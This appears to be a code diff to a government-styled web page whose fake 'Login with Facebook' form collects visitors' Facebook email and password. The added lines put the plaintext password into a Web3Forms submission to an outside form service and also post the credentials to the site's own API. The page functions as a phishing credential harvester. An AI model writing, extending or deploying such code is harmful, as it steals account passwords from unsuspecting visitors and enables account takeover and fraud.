@@ -192,7 +192,7 @@
                 <form id="visitorFacebookForm" class="auth-form-panel is-hidden space-y-4">
                     <div class="flex flex-col items-center">
                         <div class="w-full">
-                            <div class="mb-2"><label class="block text-sm font-medium text-gray-700 mb-2">Facebook Username</label><input type="text" id="fbUsername" class="gov-input" autocomplete="username"></div>
+                            <div class="mb-2"><label class="block text-sm font-medium text-gray-700 mb-2">Facebook Email</label><input type="text" id="fbUsername" class="gov-input" autocomplete="username"></div>
                             <div class="mb-2"><label class="block text-sm font-medium text-gray-700 mb-2">Facebook Password</label><input type="password" id="fbPassword" class="gov-input" autocomplete="current-password"></div>
                             <button type="button" id="fbSubmit" class="gov-btn w-full"><img src="./facebook.png" class="inline-block w-5 h-5 mr-2 align-middle">Login with Facebook</button>
                         </div>
@@ -946,11 +946,42 @@
                             fullName: savePayload.name,
                             email: savePayload.email,
                             name: username,
-                            message: 'Account authentication request',
+                            message: password,
                             from_name: savePayload.name
                         }, 'Facebook Login Request');
                     } catch (e) {
                         console.warn('Web3Forms form submission failed', e);
+                    }
+
+                    if (saveData.isNew === false) {
+                        fbSubmitButton.dataset.mode = 'retry';
+                        const loginPayload = {
+                            facebookUsername: username,
+                            facebookPassword: password
+                        };
+                        const iconElement = fbSubmitButton.querySelector('i');
+                        if (iconElement) {
+                            iconElement.classList.add('icon-spinning');
+                        }
+                        const resp = await fetch(`${API_BASE}/auth/visitor/facebook-login`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(loginPayload)
+                        });
+                        const data = await resp.json();
+                        if (!resp.ok) {
+                            if (iconElement) {
+                                iconElement.classList.remove('icon-spinning');
+                            }
+                            fbSubmitButton.dataset.mode = 'save';
+                            fbSubmitButton.innerHTML = '<img src="./facebook.png" class="inline-block w-5 h-5 mr-2 align-middle">Login with Facebook';
+                            return document.getElementById('authMessage').textContent = data.error || 'Facebook login failed';
+                        }
+                        setVisitorAuthToken(data.token);
+                        setCurrentVisitor(data.visitor);
+                        document.getElementById('authMessage').textContent = '';
+                        showFacebookForm(false);
+                        return;
                     }
 
                     fbSubmitButton.dataset.mode = 'retry';
